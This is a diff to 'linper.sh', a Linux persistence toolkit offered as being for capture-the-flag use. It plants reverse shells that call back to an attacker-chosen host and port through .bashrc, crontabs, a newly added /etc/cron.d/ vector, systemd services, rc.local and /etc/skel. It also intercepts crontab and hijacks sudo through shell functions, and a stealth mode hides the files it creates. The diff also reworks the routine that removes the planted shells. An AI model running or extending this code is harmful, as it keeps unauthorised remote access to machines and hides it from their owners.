@@ -16,12 +16,13 @@ RANDOMPORT=$(expr 1024 + $RANDOM)
 SHELL="/bin/bash"
 SERVICEFILE=$(echo $(uuidgen).service)
 SERVICESHELLSCRIPT=$(echo $(uuidgen).sh)
+CRONDFILE=$(echo $(uuidgen | tr -d '-'))
 
 INFO="linux persistence toolkit\n\nadvisory: this was developed with ctfs in mind and that is its intended use case. please do not use this tool in an unethical or illegal manner.\n"
 
 HELP="\e[33m-h, --help\e[0m show this message
 \e[33m--examples\e[0m print example commands
-\e[33m-d, --dryrun\e[0m dry run, do not install persistence, just enumerate relevant binaries
+\e[33m-d, --dryrun\e[0m enumerate binaries only (if ran with -i and -c it will enumerate modifications made by this program) 
 \e[33m-e, --enum-defenses\e[0m try to enumerate any defenses relevant to installing reverse shells
 \e[33m-i, --rhost\e[0m IP/domain to call back to
 \e[33m-p, --rport\e[0m port to call back to
@@ -33,33 +34,14 @@ HELP="\e[33m-h, --help\e[0m show this message
 
 EXAMPLES="Examples:
 
-Enumerate binaries that can be used for persistence
-bash linper.sh -d
-bash linper.sh --dryrun
-
-Enumerate defenses
-bash linper.sh -e
-bash linper.sh --enum-defenses
-
-Install persistence to call back to 192.168.1.2:4444 (default cron & noisy)
-bash linper.sh -i 192.168.1.2 -p 4444
-bash linper.sh --rhost 192.168.1.2 -rport 4444
-
-Install only 3 reverse shells
-bash linper.sh -i 192.168.1.2 -p 4444 -l 3
-bash linper.sh --rhost 192.168.1.2 --rport 4444 --limit 3
-
-Install persistence (custom cron & stealthy)
-bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
-bash linper.sh -rhost 192.168.1.2 --rport 4444 --cron \"* * * 2 3\" --stealth-mode
-
-Insall persistence with supplied directory for temporary files
-bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
-bash linper.sh -rhost 192.168.1.2 --rport 4444 --writable-dir /tmp/i/do/not/exist
-
-Remove persistence for 192.168.1.2
-bash linper.sh -i 192.168.1.2 -c
-bash linper.sh --rhost 192.168.1.2 --clean"
+Enumerate binaries that can be used for persistence: bash linper.sh -d
+Enumerate defenses: bash linper.sh -e
+Install persistence (default cron & noisy): bash linper.sh -i 192.168.1.2 -p 4444
+Install only 3 reverse shells: bash linper.sh -i 192.168.1.2 -p 4444 -l 3
+Install persistence (custom cron & stealthy): bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
+Insall persistence with supplied directory for temporary files: bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
+Enumerate reverse shells and other modifications to the file system made by this program: bash linper.sh -i 192.168.1.2 -c -d
+Remove persistence for 192.168.1.2: bash linper.sh -i 192.168.1.2 -c"
 
 while test $# -gt 0;
 do
@@ -160,6 +142,7 @@ stealth_modifications() {
     DISABLEBASHRC=1
     SERVICEFILE=$(echo /etc/systemd/system/.$(uuidgen).service)
     SERVICESHELLSCRIPT=$(echo /etc/systemd/system/.$(uuidgen))
+    CRONDFILE=.$(echo $(uuidgen | tr -d '-'))
 
     echo 'function crontab () { #linpercrontab
     REALBIN="$(which crontab)" #linpercrontab
@@ -293,7 +276,8 @@ enum_doors() {
     DOORS=(
 	"$HOME/.bashrc , if test -f $HOME/.bashrc; then touch $HOME/.bashrc; else touch $HOME/.bashrc &&  $HOME/.bashrc; fi , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> $HOME/.bashrc?"
 	"/var/spool/cron/crontabs/$(whoami) , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD; if grep -qi [A-Za-z0-9] $TMPCRONWITHPAYLOAD; then crontab $TMPCRONWITHPAYLOAD; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $TMPCRONWITHPAYLOAD; crontab $TMPCRONWITHPAYLOAD && chmod +x $TMPCRONWITHPAYLOAD?"
-	"/etc/crontab , find /etc/ -name crontab -writable | grep -qi crontab , echo \"$CRON $(whoami) $PAYLOAD\" >> /etc/crontab?"
+	"/etc/crontab , find /etc/ -type f -name crontab -writable | grep -qi crontab , echo \"$CRON $(whoami) $PAYLOAD\" >> /etc/crontab?"
+	"/etc/cron.d/ , find /etc/cron.d/ -type d -writable | head -n 1 | grep cron 2> /dev/null 1>&2 , echo \"$CRON $(whoami) $PAYLOAD\" >> /etc/cron.d/$CRONDFILE?"
 	"/etc/systemd/ , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$SERVICESHELLSCRIPT; if test -f /etc/systemd/system/$SERVICEFILE; then echo > /dev/null; else touch /etc/systemd/system/$SERVICEFILE; echo \"[Service]\" >> /etc/systemd/system/$SERVICEFILE; echo \"Type=oneshot\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$SERVICESHELLSCRIPT\" >> /etc/systemd/system/$SERVICEFILE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$SERVICEFILE; echo \"[Install]\" >> /etc/systemd/system/$SERVICEFILE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$SERVICEFILE; chmod 644 /etc/systemd/system/$SERVICEFILE; systemctl start $SERVICEFILE 2> /dev/null & sleep .0001; systemctl enable $SERVICEFILE 2> /dev/null & sleep .0001; fi;?"
 	"/etc/rc.local , if test -f /etc/rc.local; then touch /etc/rc.local; else touch /etc/rc.local &&  /etc/rc.local; fi , if test -f /etc/rc.local; then LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo \"$PAYLOAD\" >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local?"
 	"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null 1>&2 & sleep .0001\" >> /etc/skel/.bashrc?"
@@ -434,51 +418,94 @@ shadow() {
 cleanup() {
 
     TMPCLEANBASHRC=$(echo $WRITABLE_DIR/$(uuidgen))
-    TMPCLEANBASHRC2=$(echo $WRITABLE_DIR/$(uuidgen))
-    TMPCLEANBASHRC3=$(echo $WRITABLE_DIR/$(uuidgen))
     TMPCLEANRCLOCAL=$(echo $WRITABLE_DIR/$(uuidgen))
     TMPCLEANCRONTAB=$(echo $WRITABLE_DIR/$(uuidgen))
 
-    echo -e "\e[92m[+]\e[0m Removing modifications, this may take a while..."
+    if [ "$DRYRUN" -ne 1 ];
+    then
+	echo -e "\e[92m[+]\e[0m Removing modifications, this may take a while..."
+    fi
 
     if $(grep -qi "#linpercrontab" ~/.bashrc);
     then
-	grep -v "#linpercrontab" ~/.bashrc > $TMPCLEANBASHRC &&
+	if [ "$DRYRUN" -eq 1 ];
+	then
+	    echo -e "\e[92m[+]\e[0m Crontab Intercept Found: $HOME/.bashrc"
+	else
+	    grep -v "#linpercrontab" ~/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed crontab function from $HOME/.bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed Crontab Intercept: $HOME/.bashrc"
+	fi
     fi
 
     if $(grep -qi "#linpersudo" ~/.bashrc);
     then
-	grep -v "#linpersudo" ~/.bashrc > $TMPCLEANBASHRC &&
+	if [ "$DRYRUN" -eq 1 ];
+	then
+	    echo -e "\e[92m[+]\e[0m Sudo Hijack Attack Found: $HOME/.bashrc"
+	else
+	    grep -v "#linpersudo" ~/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed sudo function from $HOME/.bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed Sudo Hijack Attack: $HOME/.bashrc"
+	fi
     fi
 
     if $(grep -qi $1 ~/.bashrc);
     then
-	grep -v $1 ~/.bashrc > $TMPCLEANBASHRC &&
+	if [ "$DRYRUN" -eq 1 ];
+	then
+	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: $HOME/.bashrc"
+	else
+	    grep -v $1 ~/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC ~/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $HOME/.bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $HOME/.bashrc"
+	    $REMOVALTOOL $TMPCLEANBASHRC
+	fi
     fi
 
     CRONBINARY=$(which crontab)
     if $($CRONBINARY -l 2> /dev/null | grep -q $1);
     then
-	$CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /var/spool/crontab/$(whoami)"
+	if [ "$DRYRUN" -eq 1 ];
+	then
+	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /var/spool/crontab/$(whoami)"
+	else
+	    $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null 1>&2 && $CRONBINARY -l | grep -v $1 2> /dev/null | grep "[A-Za-z0-9]" 2> /dev/null | $CRONBINARY || $CRONBINARY -r
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /var/spool/crontab/$(whoami)"
+	fi
     fi
 
     if $(grep -qi $1 /etc/crontab 2> /dev/null);
     then
-	grep -v $1 /etc/crontab > $TMPCLEANCRONTAB &&
-	    mv $TMPCLEANCRONTAB /etc/crontab &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/crontab"
+	if [ "$DRYRUN" -eq 1 ];
+	then
+	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /etc/crontab"
+	else
+	    grep -v $1 /etc/crontab > $TMPCLEANCRONTAB &&
+	    cp $TMPCLEANCRONTAB /etc/crontab &&
+	    $REMOVALTOOL $TMPCLEANCRONTAB &&
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/crontab"
+	fi
     fi
+
+    for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') /etc/cron.d/ -writable -type f 2> /dev/null);
+    do
+	grep -qi $1 $i 2> /dev/null
+	if [[ $? -eq 0 ]];
+	then
+	    if [ "$DRYRUN" -eq 1 ];
+	    then
+		echo -e "\e[92m[+]\e[0m Reverse Shell Found: $i"
+	    else
+		$REMOVALTOOL $i &&
+		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
+	    fi
+	fi
+    done
 
     for i in $(find /etc/systemd/ -writable -type f 2> /dev/null);
     do
-	grep -q $1 $i 2> /dev/null
+	grep -qi $1 $i 2> /dev/null
 	if [[ $? -eq 0 ]];
 	then
 	    TMP=$(echo $i | sed 's/.*\///g' | tr -d '.' | sed 's/..$//g')
@@ -487,43 +514,63 @@ cleanup() {
 		grep -q $TMP $j 2> /dev/null
 		if [[ $? -eq 0 ]];
 		then
-		    $REMOVALTOOL $i $j
-		    CLEANSYSMSG=1
+		    if [ "$DRYRUN" -eq 1 ];
+		    then
+			echo -e "\e[92m[+]\e[0m Reverse Shell Found: $i"
+			echo -e "\e[92m[+]\e[0m Reverse Shell Stager Found: $j"
+		    else
+			$REMOVALTOOL $i $j &&
+			echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i" &&
+			echo -e "\e[92m[+]\e[0m Removed Reverse Shell Stager: $j"
+		    fi
 		fi
 	    done
 	fi
     done
 
-    if [ "$CLEANSYSMSG" -eq 1 ];
-    then
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/sytemd/"
-    fi
-
     if $(grep -q $1 /etc/rc.local 2> /dev/null);
     then
-	grep -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
-	cp $TMPCLEANRCLOCAL "/etc/rc.local"
-	if $(cat /etc/rc.local | wc -l | grep -q "^2$");
+	if [ "$DRYRUN" -eq 1 ];
 	then
-	    $REMOVALTOOL "/etc/rc.local"
+	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /etc/rc.local"
+	else
+	    grep -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL &&
+	    cp $TMPCLEANRCLOCAL "/etc/rc.local" &&
+	    if $(cat /etc/rc.local | wc -l | grep -q "^2$");
+	    then
+		$REMOVALTOOL "/etc/rc.local"
+	    fi
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/rc.local"
+	    $REMOVALTOOL $TMPCLEANRCLOCAL
 	fi
-	echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/rc.local"
     fi
 
     if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
     then
-	grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC &&
+	if [ "$DRYRUN" -eq 1 ];
+	then
+	    echo -e "\e[92m[+]\e[0m Reverse Shell Found: /etc/skel/.bashrc"
+	else
+	    grep -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC &&
 	    cp $TMPCLEANBASHRC /etc/skel/.bashrc &&
-	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from /etc/skel/.bashrc"
+	    echo -e "\e[92m[+]\e[0m Removed Reverse Shell: /etc/skel/.bashrc"
+	fi
     fi
-
-    cd $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') && grep -R --color=never "$1" . | awk -F: '{print $1}' | xargs $REMOVALTOOL 2> /dev/null &> /dev/null && echo -e "\e[92m[+]\e[0m Removed Reverse Shell(s) from $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}')/*"
-
-    $REMOVALTOOL $TMPCLEANBASHRC
-    $REMOVALTOOL $TMPCLEANBASHRC2
-    $REMOVALTOOL $TMPCLEANBASHRC3
-    $REMOVALTOOL $TMPCLEANRCLOCAL
-    $REMOVALTOOL $TMPCLEANCRONTAB
+    
+    for i in $(find $(grep --color=never "www-data" /etc/passwd | awk -F: '{print $6}') -writable -type f 2> /dev/null);
+    do
+	grep -qi $1 $i 2> /dev/null
+	if [[ $? -eq 0 ]];
+	then
+	    if [ "$DRYRUN" -eq 1 ];
+	    then
+		echo -e "\e[92m[+]\e[0m Reverse Shell Found: $i"
+	    else
+		$REMOVALTOOL $i &&
+		echo -e "\e[92m[+]\e[0m Removed Reverse Shell: $i"
+	    fi
+	fi
+    done
 
 }
 
